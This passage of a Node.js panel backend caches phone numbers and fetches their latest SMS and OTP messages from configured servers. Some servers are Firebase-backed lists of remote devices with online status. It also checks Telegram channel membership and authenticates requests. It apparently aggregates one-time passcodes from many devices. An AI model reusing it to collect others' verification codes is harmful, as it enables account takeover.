            this.redis = new Redis(config.REDIS_URL, {
                maxRetriesPerRequest: 3,
                enableReadyCheck: true,
                lazyConnect: true
            });

            this.redis.on('connect', () => {
                console.log('[Cache] Redis connected');
                this.redisEnabled = true;
            });

            this.redis.on('error', (err) => {
                console.error('[Cache] Redis error:', err.message);
                this.redisEnabled = false;
            });

            this.redis.on('close', () => {
                console.log('[Cache] Redis disconnected. Falling back to memory.');
                this.redisEnabled = false;
            });
        } catch (e) {
            console.error('[Cache] Redis init failed:', e.message);
        }
    }

    // ==================== DB INFO CACHE ====================
    async getDbInfo() {
        const now = Date.now();
        if (this.redisEnabled) {
            try {
                const cached = await this.redis.get('cache:dbinfo');
                if (cached) {
                    const { data, ts } = JSON.parse(cached);
                    if (now - ts < config.CACHE_TTL.DB_INFO) return data;
                }
            } catch (e) { this.redisEnabled = false; }
        }

        if (this.memory.dbInfo && (now - this.memory.dbInfoTimestamp) < config.CACHE_TTL.DB_INFO) {
            return this.memory.dbInfo;
        }
        return null;
    }

    async setDbInfo(data) {
        const now = Date.now();
        this.memory.dbInfo = data;
        this.memory.dbInfoTimestamp = now;

        if (this.redisEnabled) {
            try {
                await this.redis.setex('cache:dbinfo', Math.floor(config.CACHE_TTL.DB_INFO / 1000), 
                    JSON.stringify({ data, ts: now }));
            } catch (e) { /* ignore */ }
        }
    }

    // ==================== SERVER COUNTS CACHE ====================
    async getServerCounts() {
        const now = Date.now();
        if (this.redisEnabled) {
            try {
                const cached = await this.redis.get('cache:servercounts');
                if (cached) {
                    const { data, ts } = JSON.parse(cached);
                    if (now - ts < config.CACHE_TTL.SERVER_COUNTS) return data;
                }
            } catch (e) { this.redisEnabled = false; }
        }

        if (this.memory.serverCounts.length > 0 && (now - this.memory.serverCountsTimestamp) < config.CACHE_TTL.SERVER_COUNTS) {
            return this.memory.serverCounts;
        }
        return null;
    }

    async setServerCounts(data) {
        const now = Date.now();
        this.memory.serverCounts = data;
        this.memory.serverCountsTimestamp = now;

        if (this.redisEnabled) {
            try {
                await this.redis.setex('cache:servercounts', Math.floor(config.CACHE_TTL.SERVER_COUNTS / 1000),
                    JSON.stringify({ data, ts: now }));
            } catch (e) { /* ignore */ }
        }
    }

    // ==================== RECENT CACHE (Tiered) ====================
    async getRecentEntry(number, tier, ttlMinutes = 90) {
        if (this.redisEnabled) {
            try {
                const data = await this.redis.get(`sms:${tier}:${number}`);
                if (data) {
                    const parsed = JSON.parse(data);
                    const stamp = Number(parsed.timestamp || parsed.mostRecentSmsTime || 0);
                    if (!stamp || Date.now() - stamp <= ttlMinutes * 60 * 1000) return parsed;
                    await this.redis.del(`sms:${tier}:${number}`);
                }
            } catch (e) { /* ignore */ }
        }
        return this.memory.recentCache[tier].get(number) || null;
    }

    async setRecentEntry(number, tier, entry, ttlMinutes = 90) {
        this.memory.recentCache[tier].set(number, entry);

        if (this.redisEnabled) {
            try {
                await this.redis.setex(`sms:${tier}:${number}`, ttlMinutes * 60, JSON.stringify(entry));
            } catch (e) { /* ignore */ }
        }
    }

    getRecentCacheTier(tier) {
        return this.memory.recentCache[tier];
    }

    getAllRecentCaches() {
        return this.memory.recentCache;
    }

    // ==================== SMS NOTIFICATION CACHE (Latest 2 Min) ====================
    getSmsNotifications() {
        return this.memory.smsNotifications;
    }

    setSmsNotification(number, entry) {
        this.memory.smsNotifications.set(number, entry);
    }

    deleteSmsNotification(number) {
        this.memory.smsNotifications.delete(number);
    }

    clearSmsNotifications() {
        this.memory.smsNotifications.clear();
    }

    getSmsNotificationStats() {
        return this.memory.smsNotifications.size;
    }

    // ==================== SERVER NUMBERS ====================
    getServerNumbers(serverId) {
        return this.memory.serverNumbers.get(serverId) || null;
    }

    hasFreshServerNumbers(serverId, ttl = config.SERVER_NUMBERS_TTL) {
        const entry = this.getServerNumbers(serverId);
        return Boolean(entry && Array.isArray(entry.numbers) && Number.isFinite(entry.timestamp) && Date.now() - entry.timestamp < ttl);
    }

    setServerNumbers(serverId, data) {
        this.memory.serverNumbers.set(serverId, data);
    }

    // ==================== LOADING PROGRESS ====================
    getLoadingProgress(serverId) {
        return this.memory.loadingProgress.get(serverId) || null;
    }

    setLoadingProgress(serverId, data) {
        this.memory.loadingProgress.set(serverId, data);
    }

    // ==================== DASHBOARD CACHE ====================
    getDashboardCache() {
        const now = Date.now();
        if (this.memory.dashboardCache && (now - this.memory.dashboardCacheTime) < getRuntimeOptions().dashboardTtlMs) {
            return this.memory.dashboardCache;
        }
        return null;
    }

    setDashboardCache(data) {
        this.memory.dashboardCache = data;
        this.memory.dashboardCacheTime = Date.now();
    }

    // ==================== CACHE FLAGS ====================
    get dbInfoRefreshing() { return this.memory.dbInfoRefreshing; }
    set dbInfoRefreshing(val) { this.memory.dbInfoRefreshing = val; }

    get serverCountsRefreshing() { return this.memory.serverCountsRefreshing; }
    set serverCountsRefreshing(val) { this.memory.serverCountsRefreshing = val; }

    get recentCacheRefreshing() { return this.memory.recentCacheRefreshing; }
    set recentCacheRefreshing(val) { this.memory.recentCacheRefreshing = val; }

    // ==================== CLEANUP ====================
    enforceLimit(tier, maxSize) {
        const cache = this.memory.recentCache[tier];
        if (cache.size <= maxSize) return;
        const entriesToDelete = cache.size - maxSize;
        let deleted = 0;
        for (const key of cache.keys()) {
            if (deleted >= entriesToDelete) break;
            cache.delete(key);
            deleted++;
        }
    }

    clearTier(tier) {
        this.memory.recentCache[tier].clear();
    }

    clearAll() {
        Object.values(this.memory.recentCache).forEach(c => c.clear());
    }

    getStats() {
        return {
            redisEnabled: this.redisEnabled,
            '2min': this.memory.recentCache['2'].size,
            '10min': this.memory.recentCache['10'].size,
            '30min': this.memory.recentCache['30'].size,
            '60min': this.memory.recentCache['60'].size,
            older: this.memory.recentCache['older'].size,
            smsNotifications: this.memory.smsNotifications.size,
            serverNumbers: this.memory.serverNumbers.size,
            loadingProgress: this.memory.loadingProgress.size,
            adminCache: {
                overview: this.memory.adminCache.overview ? 'cached' : 'empty',
                servers: this.memory.adminCache.servers ? 'cached' : 'empty',
                users: this.memory.adminCache.users.size,
                settings: this.memory.adminCache.settings ? 'cached' : 'empty',
            }
        };
    }

    // ==================== ADMIN CACHE (fixes slow admin panel) ====================
    getAdminOverview() {
        const now = Date.now();
        if (this.memory.adminCache.overview && (now - this.memory.adminCache.overviewTs) < this.ADMIN_TTL.overview) {
            return this.memory.adminCache.overview;
        }
        return null;
    }
    setAdminOverview(data) {
        this.memory.adminCache.overview = data;
        this.memory.adminCache.overviewTs = Date.now();
    }
    getAdminServers() {
        const now = Date.now();
        if (this.memory.adminCache.servers && (now - this.memory.adminCache.serversTs) < this.ADMIN_TTL.servers) {
            return this.memory.adminCache.servers;
        }
        return null;
    }
    setAdminServers(data) {
        this.memory.adminCache.servers = data;
        this.memory.adminCache.serversTs = Date.now();
    }
    getAdminUsers(queryKey) {
        const now = Date.now();
        const entry = this.memory.adminCache.users.get(queryKey);
        if (entry && (now - entry.ts) < this.ADMIN_TTL.users) {
            return entry.data;
        }
        return null;
    }
    setAdminUsers(queryKey, data) {
        this.memory.adminCache.users.set(queryKey, { data, ts: Date.now() });
        // Prevent unbounded growth
        if (this.memory.adminCache.users.size > 50) {
            const firstKey = this.memory.adminCache.users.keys().next().value;
            this.memory.adminCache.users.delete(firstKey);
        }
    }
    clearAdminCache() {
        this.memory.adminCache.overview = null;
        this.memory.adminCache.overviewTs = 0;
        this.memory.adminCache.servers = null;
        this.memory.adminCache.serversTs = 0;
        this.memory.adminCache.users.clear();
        this.memory.adminCache.settings = null;
        this.memory.adminCache.settingsTs = 0;
    }

    async health() {
        if (!this.redis) return { redis: false, memory: true };
        try {
            await this.redis.ping();
            return { redis: true, memory: true };
        } catch {
            return { redis: false, memory: true };
        }
    }
}

const cache = new CacheManager();

// ==================== SERVICES ====================

// ==================== FETCH WITH RETRY ====================
async function fetchWithRetry(url, timeout = config.FETCH_TIMEOUT, retries = config.FETCH_RETRIES) {
    if (!url) return null;
    for (let i = 0; i <= retries; i++) {
        let controller = null;
        let timeoutId = null;
        try {
            controller = new AbortController();
            timeoutId = setTimeout(() => {
                try { controller.abort(); } catch (e) {}
            }, timeout);

            const res = await fetch(url, {
                signal: controller.signal,
                headers: { 'Accept': 'application/json' }
            });

            clearTimeout(timeoutId);

            const contentType = res.headers.get('content-type') || '';
            if (!contentType.includes('application/json')) {
                const text = await res.text();
                try { return JSON.parse(text); } catch { return null; }
            }
            return await res.json();
        } catch (e) {
            if (timeoutId) clearTimeout(timeoutId);
            if (controller) {
                try { controller.abort(); } catch (e2) {}
            }
            console.error(`[Fetch] Attempt ${i + 1}/${retries + 1} failed for ${url}: ${e.message}`);
            if (i === retries) return null;
            await sleep(1000 * (i + 1));
        }
    }
    return null;
}

async function safeFetch(url, timeout, retries) {
    try {
        return await fetchWithRetry(url, timeout, retries);
    } catch (err) {
        console.error(`[SafeFetch] Critical error for ${url}:`, err.message);
        return null;
    }
}

// ==================== TELEGRAM API ====================
async function checkChannelMembership(userId, channelUsername, botToken) {
    try {
        if (!channelUsername.startsWith('@')) channelUsername = '@' + channelUsername;
        const url = `https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelUsername}&user_id=${userId}`;
        const data = await safeFetch(url, 8000, 1);
        if (!data) return { member: false, error: 'Failed to fetch channel data' };
        if (!data.ok) return { member: false, error: data.description };
        const status = data.result?.status;
        const isMember = ['creator', 'administrator', 'member', 'restricted'].includes(status);
        return { member: isMember, status };
    } catch (err) {
        console.error(`[Telegram API] Channel check error for ${channelUsername}:`, err.message);
        return { member: false, error: err.message };
    }
}

async function getChannelInfo(channelUsername, botToken) {
    try {
        if (!channelUsername.startsWith('@')) channelUsername = '@' + channelUsername;
        const url = `https://api.telegram.org/bot${botToken}/getChat?chat_id=${channelUsername}`;
        const data = await safeFetch(url, 8000, 1);
        if (!data || !data.ok) return null;
        return {
            id: data.result.id,
            title: data.result.title,
            username: data.result.username,
            inviteLink: data.result.invite_link || `https://t.me/${data.result.username}`
        };
    } catch (err) {
        console.error(`[Telegram API] Get chat error for ${channelUsername}:`, err.message);
        return null;
    }
}

// ==================== TURNSTILE ====================
async function verifyTurnstile(token, secretKey) {
    if (!token) return { ok: false, message: 'Turnstile token missing' };
    if (!secretKey) return process.env.NODE_ENV === 'production' ? { ok: false, message: 'Turnstile is not configured' } : { ok: true };

    let controller = null;
    let timeoutId = null;
    try {
        const formData = new URLSearchParams();
        formData.append('secret', secretKey);
        formData.append('response', token);

        controller = new AbortController();
        timeoutId = setTimeout(() => {
            try { controller.abort(); } catch (e) {}
        }, 10000);

        const res = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        const data = await res.json();
        if (data.success) return { ok: true };
        return { ok: false, message: 'Turnstile failed: ' + (data['error-codes']?.join(', ') || 'unknown') };
    } catch (err) {
        if (timeoutId) clearTimeout(timeoutId);
        if (controller) {
            try { controller.abort(); } catch (e2) {}
        }
        console.error('[Turnstile] Verification error:', err.message);
        return { ok: false, message: 'Turnstile error: ' + err.message };
    }
}



// ==================== BACKGROUND WORKER ====================


// ==================== DB INFO FETCHER ====================
async function getCachedDbInfo() {
    const now = Date.now();

    // Server definitions are cacheable, but BotConfig/settings are always read
    // live so user-facing settings and access rules never become stale.
    const cached = await cache.getDbInfo();
    if (cached && Array.isArray(cached.servers)) {
        const liveConfig = await BotConfig.findOne({ key: 'main_config' }).lean();
        const liveData = { config: liveConfig, servers: cached.servers };
        cache.memory.dbInfo = liveData;
        cache.memory.dbInfoTimestamp = now;
        return liveData;
    }

    if (cache.memory.dbInfoRefreshing) {
        let waited = 0;
        while (cache.memory.dbInfoRefreshing && waited < 5000) {
            await sleep(100);
            waited += 100;
        }
        const afterWait = await cache.getDbInfo();
        if (afterWait) return afterWait;
    }

    cache.dbInfoRefreshing = true;
    try {
        const [configDoc, servers] = await Promise.all([
            BotConfig.findOne({ key: 'main_config' }).lean(),
            ServerConfig.find().sort({ serverId: 1 }).lean()
        ]);

        const data = { config: configDoc, servers };
        await cache.setDbInfo(data);
        return data;
    } catch (err) {
        console.error('[Cache] DB info fetch error:', err.message);
        return { config: null, servers: [] };
    } finally {
        cache.dbInfoRefreshing = false;
    }
}

function getRuntimeOptions() {
    const saved = (cache && cache.memory && cache.memory.dbInfo && cache.memory.dbInfo.config) || {};
    const clamp = (value, min, max, fallback) => {
        const number = Number(value);
        return Number.isFinite(number) ? Math.min(max, Math.max(min, number)) : fallback;
    };
    return {
        autoFetch: saved.autoFetch === undefined ? config.AUTO_FETCH : Boolean(saved.autoFetch),
        smsLatestLimit: clamp(saved.smsLatestLimit, 1, 100, 10),
        refreshIntervalMs: clamp(saved.cacheRefreshIntervalMs, 15000, 86400000, config.CACHE_REFRESH_INTERVAL_MS),
        dashboardTtlMs: clamp(saved.cacheTtlDashboard, 1000, 3600000, config.DASHBOARD_CACHE_TTL),
        serverTtlMs: clamp(saved.cacheTtlServer, 5000, 3600000, config.SERVER_NUMBERS_TTL),
        smsTtlMs: clamp(saved.cacheTtlSms, 1000, 3600000, 5000)
    };
}
function clearAllApplicationCaches() {
    cache.memory.dbInfo = null;
    cache.memory.dbInfoTimestamp = 0;
    cache.memory.serverCounts = [];
    cache.memory.serverCountsTimestamp = 0;
    cache.memory.serverNumbers.clear();
    cache.memory.loadingProgress.clear();
    cache.memory.smsNotifications.clear();
    cache.memory.dashboardCache = null;
    cache.memory.dashboardCacheTime = 0;
    cache.clearAll();
    cache.clearAdminCache(); // FIX: also clear admin panel cache
}
function applyAutoFetchSetting(enabled) {
    if (enabled) startRecentNumbersCache(true);
    else stopRecentNumbersCache();
}

// ==================== SERVER COUNTS ====================
async function getCachedServerCounts(forceRefresh = false) {
    const cached = await cache.getServerCounts();
    if (cached && !forceRefresh) return cached;

    if (cache.serverCountsRefreshing) {
        let waited = 0;
        while (cache.serverCountsRefreshing && waited < 5000) {
            await sleep(100);
            waited += 100;
        }
        const afterWait = await cache.getServerCounts();
        if (afterWait) return afterWait;
    }

    cache.serverCountsRefreshing = true;
    try {
        const { servers } = await getCachedDbInfo();

        // Fetch counts in parallel with limit
        const counts = await batchProcess(servers, config.SERVER_CONCURRENCY, async (s) => {
            let count = 0;
            let sourceNumbers = [];
            try {
                sourceNumbers = await getServerNumbersFromSource(s) || [];
                count = sourceNumbers.length || countNumbersFromData(sourceNumbers);
            } catch (e) {
                console.error(`[Cache] Count error for ${s.serverName}:`, e.message);
            }
            return { serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey, count, online: sourceNumbers.filter(n => n.online === true || String(n.status).toLowerCase() === 'online').length, offline: sourceNumbers.filter(n => n.online !== true && String(n.status).toLowerCase() !== 'online').length, firebase: isFirebaseServer(s) };
        });

        const successful = counts
            .filter(r => r.status === 'fulfilled')
            .map(r => r.value);

        await cache.setServerCounts(successful);
        return successful;
    } catch (err) {
        console.error('[Cache] Server counts error:', err.message);
        return [];
    } finally {
        cache.serverCountsRefreshing = false;
    }
}

// ==================== BUILD CACHE FOR SINGLE SERVER ====================
async function buildRecentCacheForServer(server, allNumbers) {
    const now = Date.now();
    const CONCURRENCY = config.NUMBER_CONCURRENCY;

    // 1. ATOMIC REPLACEMENT: Clear old entries for this server before building new cache
    clearServerCache(server.serverId);

    cache.setLoadingProgress(server.serverId, {
        total: allNumbers.length,
        loaded: 0,
        status: 'loading',
        lastUpdate: now,
        serverName: server.serverName
    });

    let successCount = 0;
    let failCount = 0;
    let noSmsCount = 0;
    let tierCounts = { '2': 0, '10': 0, '30': 0, '60': 0, 'older': 0 };

    // 2. BULK FETCH: For Firebase servers, load ALL SMS once globally.
    // This replaces N per-device API calls with a single call.
    let bulkSms = [];
    let smsByDevice = new Map();
    let smsByPhone = new Map();

    if (isFirebaseServer(server)) {
        try {
            bulkSms = await fbGetAllSms(server, Math.max(200, getRuntimeOptions().smsLatestLimit * 3));
            // Group by device_id for O(1) lookup during number processing
            for (const sms of bulkSms) {
                const devId = String(sms.device_id || sms.deviceId || 'unknown').trim();
                if (!smsByDevice.has(devId)) smsByDevice.set(devId, []);
                smsByDevice.get(devId).push(sms);
            }
            // Also index by phone number extracted from device_id or body
            for (const sms of bulkSms) {
                const bodyPhones = fbPhones(sms.raw || {});
                for (const phone of bodyPhones) {
                    if (!smsByPhone.has(phone)) smsByPhone.set(phone, []);
                    smsByPhone.get(phone).push(sms);
                }
            }
        } catch (e) {
            console.error(`[Cache] Bulk SMS fetch failed for ${server.serverName}:`, e.message);
            bulkSms = [];
        }
    }

    await batchProcess(allNumbers, CONCURRENCY, async (n) => {
        try {
            let smsList = [];
            let otpRequest = { mode: isFirebaseServer(server) ? 'firebase' : 'number', parameter: n.number, url: null };

            if (isFirebaseServer(server)) {
                // Use pre-fetched bulk SMS — zero additional API calls
                const devId = String(n.deviceId || n.device_id || '').trim();
                const cleanNum = fbClean(n.number);
                smsList = smsByDevice.get(devId) || [];
                if (!smsList.length && cleanNum) {
                    smsList = smsByPhone.get(cleanNum) || [];
                }
                // Fallback: scan all bulk SMS for any mention of this number
                if (!smsList.length && cleanNum) {
                    smsList = bulkSms.filter(s => {
                        const text = String(s.body || '').toLowerCase();
                        return text.includes(cleanNum) || String(s.device_id || '').includes(cleanNum);
                    });
                }
                // FIX: If bulk fetch failed/empty, fall back to per-device fetch
                if (!smsList.length) {
                    try {
                        const source = await getSmsFromSource(server, n.number, n.deviceId || n.device_id, getRuntimeOptions().smsLatestLimit);
                        smsList = source.sms || [];
                    } catch (e) {
                        console.error(`[Cache] Per-number fallback fetch failed for ${n.number}:`, e.message);
                    }
                }
                otpRequest.parameter = devId || n.number;
            } else {
                // URL-based servers: per-number fetch (cannot bulk easily)
                const keyForOtp = n.serverKey || server.serverKey || String(server.serverId);
                otpRequest = buildOtpFetchUrl(server, { number: n.number, deviceId: n.deviceId || n.device_id, serverKey: keyForOtp });
                if (!otpRequest.url) throw new Error(otpRequest.reason || 'Unable to build OTP URL');
                const otpData = await safeFetch(otpRequest.url, config.OTP_FETCH_TIMEOUT, config.OTP_FETCH_RETRIES);
                if (otpData) {
                    if (otpData.sms && Array.isArray(otpData.sms)) smsList = otpData.sms;
                    else if (otpData.messages && Array.isArray(otpData.messages)) smsList = otpData.messages;
                    else if (otpData.otp || otpData.message || otpData.body) smsList = [otpData];
                }
            }

            const validMessages = [];
            const parsedSmsList = [];

            smsList.forEach(msg => {
                const messageText = msg.body || msg.message || msg.text || msg.content || '';
                if (isErrorOrSystemMessage(messageText)) return;
                if (!hasMeaningfulSmsContent(msg)) return;

                const utcMs = getSmsTimestampUtc(msg);
                if (!utcMs || utcMs <= 0) return;
                if (utcMs - now > 60000) return;

                const displayStr = getSmsDisplayTime(msg) || formatIndianTime(utcMs);
                validMessages.push({ utcMs, displayStr, msg });
                parsedSmsList.push({ ...msg, _parsedTime: utcMs, _displayTime: displayStr, _hasContent: true });
            });

            let mostRecentTime = 0;
            let latestDisplayTime = null;
            let hasAnySms = false;

            if (validMessages.length > 0) {
                hasAnySms = true;
                validMessages.sort((a, b) => b.utcMs - a.utcMs);
                mostRecentTime = validMessages[0].utcMs;
                latestDisplayTime = validMessages[0].displayStr;
            }

            const entry = {
                data: n,
                timestamp: now,
                serverId: server.serverId,
                fetchMode: otpRequest.mode,
                fetchParameter: otpRequest.parameter,
                mostRecentSmsTime: mostRecentTime,
                mostRecentDisplayTime: latestDisplayTime,
                hasSms: hasAnySms,
                smsCount: validMessages.length,
                parsedSmsList: parsedSmsList
            };

            let targetTier = 'older';
            if (hasAnySms && mostRecentTime > 0) {
                const ageMs = now - mostRecentTime;
                if (ageMs >= 0) {
                    if (ageMs <= 2 * 60000) targetTier = '2';
                    else if (ageMs <= 10 * 60000) targetTier = '10';
                    else if (ageMs <= 30 * 60000) targetTier = '30';
                    else if (ageMs <= 60 * 60000) targetTier = '60';
                    else targetTier = 'older';
                }
            }

            await cache.setRecentEntry(n.number, targetTier, entry, Math.ceil(config.SMS_EXPIRY_MINUTES));
            tierCounts[targetTier]++;

            // SMS NOTIFICATION TIER: store only the latest 1st SMS per number
            if (hasAnySms && mostRecentTime > 0 && (now - mostRecentTime) <= 2 * 60000) {
                const latestMsg = validMessages[0];
                const messageText = latestMsg.msg.body || latestMsg.msg.message || latestMsg.msg.text || latestMsg.msg.content || '';
                cache.setSmsNotification(n.number, {
                    number: n.number,
                    serverId: server.serverId,
                    serverName: server.serverName,
                    serverKey: n.serverKey || server.serverKey,
                    deviceName: n.deviceName,
                    deviceId: n.deviceId || n.device_id || null,
                    fetchMode: otpRequest.mode,
                    fetchParameter: otpRequest.parameter,
                    smsTime: mostRecentTime,
                    smsDisplayTime: latestDisplayTime,
                    smsCount: validMessages.length,
                    latestSms: {
                        sender: latestMsg.msg.sender || latestMsg.msg.from || 'Unknown',
                        message: messageText,
                        displayTime: latestDisplayTime,
                        utcMs: mostRecentTime
                    }
                });
            }

            if (!hasAnySms) noSmsCount++;
            successCount++;

        } catch (e) {
            console.error(`[Cache] Error ${n.number} on ${server.serverName}:`, e.message);
            const entry = {
                data: n,
                timestamp: now,
                serverId: server.serverId,
                fetchMode: 'unknown',
                fetchParameter: null,
                mostRecentSmsTime: 0,
                mostRecentDisplayTime: null,
                hasSms: false,
                smsCount: 0,
                parsedSmsList: [],
                fetchFailed: true,
                error: e.message
            };
            cache.memory.recentCache['older'].set(n.number, entry);
            tierCounts['older']++;
            failCount++;
        } finally {
            const progress = cache.getLoadingProgress(server.serverId);
            if (progress) {
                progress.loaded = Math.min(progress.loaded + 1, allNumbers.length);
                progress.lastUpdate = Date.now();
            }
        }
    });

    const prog = cache.getLoadingProgress(server.serverId);
    if (prog) {
        prog.loaded = allNumbers.length;
        prog.status = 'complete';
        prog.lastUpdate = Date.now();
    }

    console.log(`[Cache] ${server.serverName}: ${successCount} OK, ${failCount} FAIL, ${noSmsCount} No-SMS | 2m=${tierCounts['2']} 10m=${tierCounts['10']} 30m=${tierCounts['30']} 60m=${tierCounts['60']} old=${tierCounts['older']}`);
}// ==================== NON-BLOCKING CACHE EXPIRY ====================
function expireCacheNonBlocking() {
    const smsExpiry = Date.now() - config.SMS_EXPIRY_MINUTES * 60000;
    const tiers = Object.values(cache.memory.recentCache);
    let tierIndex = 0;
    let keysIterator = null;
    let processedInTick = 0;

    function processChunk() {
        if (tierIndex >= tiers.length) return;

        const currentCache = tiers[tierIndex];
        if (!keysIterator) keysIterator = currentCache.keys();

        let done = false;
        processedInTick = 0;

        while (!done && processedInTick < config.CACHE_CLEANUP_CHUNK_SIZE) {
            const next = keysIterator.next();
            if (next.done) {
                tierIndex++;
                keysIterator = null;
                done = true;
                break;
            }

            const key = next.value;
            const val = currentCache.get(key);
            const checkTime = val.mostRecentSmsTime > 0 ? val.mostRecentSmsTime : val.timestamp;
            if (checkTime < smsExpiry) currentCache.delete(key);
            processedInTick++;
        }

        if (!done || tierIndex < tiers.length) {
            setImmediate(processChunk);
        }
    }

    processChunk();
}

// ==================== SMS NOTIFICATION EXPIRY (Non-Blocking) ====================
function expireSmsNotificationsNonBlocking() {
    const smsExpiry = Date.now() - 2 * 60 * 1000; // notifications are strictly latest 2 min
    const notifCache = cache.getSmsNotifications();
    let keysIterator = notifCache.keys();
    let processedInTick = 0;

    function processChunk() {
        let done = false;
        processedInTick = 0;

        while (!done && processedInTick < config.CACHE_CLEANUP_CHUNK_SIZE) {
            const next = keysIterator.next();
            if (next.done) {
                done = true;
                break;
            }

            const key = next.value;
            const val = notifCache.get(key);
            if (val && (val.smsTime || 0) <= smsExpiry) {
                notifCache.delete(key);
            }
            processedInTick++;
        }

        if (!done) {
            setImmediate(processChunk);
        }
    }

    processChunk();
}

// ==================== MAIN REFRESH ====================
async function refreshRecentCache() {
    const runtime = getRuntimeOptions();
    if (!runtime.autoFetch) {
        console.log('[Cache] AUTO_FETCH disabled. Skipping.');
        return;
    }
    if (cache.recentCacheRefreshing) {
        console.log('[Cache] Refresh in progress. Skipping.');
        return;
    }

    cache.recentCacheRefreshing = true;
    const refreshStart = Date.now();

    try {
        const { servers } = await getCachedDbInfo();
        const now = Date.now();

        // NOTE: We no longer do a global clearAll here.
        // buildRecentCacheForServer now performs per-server atomic replacement
        // (clearServerCache(serverId) before building), which prevents memory
        // bloat while avoiding race conditions between servers.

        // Process servers in parallel with concurrency limit. The worker pool
        // returns a compact count record so the dashboard can use fresh counts
        // immediately after the background refresh completes.
        const refreshedCounts = await batchProcess(servers, config.SERVER_CONCURRENCY, async (s) => {
            try {
                const nums = await getServerNumbersFromSource(s);

                if (nums.length === 0) {
                    cache.setLoadingProgress(s.serverId, {
                        total: 0, loaded: 0, status: 'complete',
                        lastUpdate: now, serverName: s.serverName
                    });
                    cache.setServerNumbers(s.serverId, { numbers: [], timestamp: Date.now() });
                    return { serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey, count: 0, online: 0, offline: 0, firebase: isFirebaseServer(s) };
                }

                // buildRecentCacheForServer clears the previous server cache
                // atomically; write serverNumbers only after that clear completes.
                await buildRecentCacheForServer(s, nums);
                cache.setServerNumbers(s.serverId, { numbers: nums, timestamp: now });
                const validNumbers = normalizeValidNumberRecords(nums);
                const online = validNumbers.filter(n => n.online === true || String(n.status || '').toLowerCase() === 'online').length;
                return { serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey, count: validNumbers.length, online, offline: validNumbers.length - online, firebase: isFirebaseServer(s) };
            } catch (e) {
                console.error(`[Cache] Refresh error for ${s.serverName}:`, e.message);
                cache.setLoadingProgress(s.serverId, {
                    total: 0, loaded: 0, status: 'error',
                    lastUpdate: now, serverName: s.serverName, error: e.message
                });
                return { serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey, count: 0, online: 0, offline: 0, firebase: isFirebaseServer(s), error: e.message };
            }
        });

        const freshCounts = refreshedCounts
            .filter(result => result.status === 'fulfilled' && result.value)
            .map(result => result.value);
        if (freshCounts.length) await cache.setServerCounts(freshCounts);
        // A cold dashboard may have cached zeros while this refresh was running.
        // Force the next request to rebuild from the newly warmed server cache.
        cache.memory.dashboardCache = null;
        cache.memory.dashboardCacheTime = 0;

        // Non-blocking expiry
        expireCacheNonBlocking();

        // Non-blocking expiry for SMS notification tier (latest 2 min only)
        expireSmsNotificationsNonBlocking();

        // Enforce limits
        cache.enforceLimit('2', config.MAX_CACHE_SIZE['2']);
        cache.enforceLimit('10', config.MAX_CACHE_SIZE['10']);
        cache.enforceLimit('30', config.MAX_CACHE_SIZE['30']);
        cache.enforceLimit('60', config.MAX_CACHE_SIZE['60']);
        cache.enforceLimit('older', config.MAX_CACHE_SIZE['older']);

        const stats = cache.getStats();
        console.log(`[Cache] Done in ${Date.now() - refreshStart}ms. Total: ${stats['2min'] + stats['10min'] + stats['30min'] + stats['60min'] + stats.older} (2m:${stats['2min']} 10m:${stats['10min']} 30m:${stats['30min']} 60m:${stats['60min']} old:${stats.older})`);
    } catch (err) {
        console.error('[Cache] Background refresh error:', err.message);
    } finally {
        cache.recentCacheRefreshing = false;
    }
}

// ==================== STARTER ====================
let cacheInterval = null;

function startRecentNumbersCache(forceEnabled = false) {
    if (cacheInterval) clearInterval(cacheInterval);
    if (!forceEnabled && !getRuntimeOptions().autoFetch) {
        console.log('[Cache] AUTO_FETCH false. Background cache DISABLED.');
        return;
    }

    // Start immediately so the first dashboard visit does not wait for a delayed cache build.
    setTimeout(() => refreshRecentCache(), 0);
    cacheInterval = setInterval(refreshRecentCache, getRuntimeOptions().refreshIntervalMs);
    console.log(`[Cache] Background refresh started (every ${getRuntimeOptions().refreshIntervalMs / 1000}s)`);
}

function stopRecentNumbersCache() {
    if (cacheInterval) {
        clearInterval(cacheInterval);
        cacheInterval = null;
    }
}



// ==================== AUTH MIDDLEWARE ====================

// Production panel is intentionally single-origin. Do not derive trust from
// the incoming Host header, otherwise an attacker can access the same app via
// an IP/default platform hostname and make it look same-origin to the server.
const PRIMARY_ORIGIN = 'https://devilcampaigns.dpdns.org';
const PRIMARY_HOST = 'devilcampaigns.dpdns.org';
function isAllowedRequestOrigin(req) {
    const origin = String(req.headers.origin || '').trim().replace(/\/$/, '').toLowerCase();
    if (!origin) return false;
    const host = String(req.headers['x-forwarded-host'] || req.get('host') || '').split(',')[0].trim().toLowerCase();
    return origin === PRIMARY_ORIGIN && host === PRIMARY_HOST;
}

async function authMiddleware(req, res, next) {
    try {
        if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method) && !isAllowedRequestOrigin(req)) {
            return res.status(403).json({ ok: false, message: 'Origin not allowed' });
        }
        const token = req.headers['x-auth-token'];
        const csrf = req.headers['x-csrf-token'];
        const requestPath = String(req.originalUrl || req.path || '').split('?')[0].replace(/\/+$/, '') || '/';
        const routerPath = String(req.path || '').split('?')[0].replace(/\/+$/, '') || '/';
        const csrfExemptPaths = ['/api/fetch-otp', '/api/number/availability', '/api/refresh'];
        const isCsrfExemptRequest = csrfExemptPaths.includes(requestPath) || csrfExemptPaths.includes(routerPath) ||
            requestPath === '/number/availability' || routerPath === '/number/availability';
        if (!token || (!csrf && !isCsrfExemptRequest)) {
            return res.status(401).json({ ok: false, message: 'Missing auth headers' });
        }

        const data = verifyToken(token, config.TOKEN_SECRET, config.SESSION_TTL_MS);
        if (!data) {
            return res.status(401).json({ ok: false, code: 'SESSION_EXPIRED', message: 'Session expired. Reopen the panel from the Telegram bot.' });
        }
        if (!isCsrfExemptRequest && data.csrfTs && Date.now() - data.csrfTs > config.CSRF_TTL_MS) {
            return res.status(401).json({ ok: false, code: 'CSRF_EXPIRED', message: 'Security token expired. Refreshing the session.' });
        }
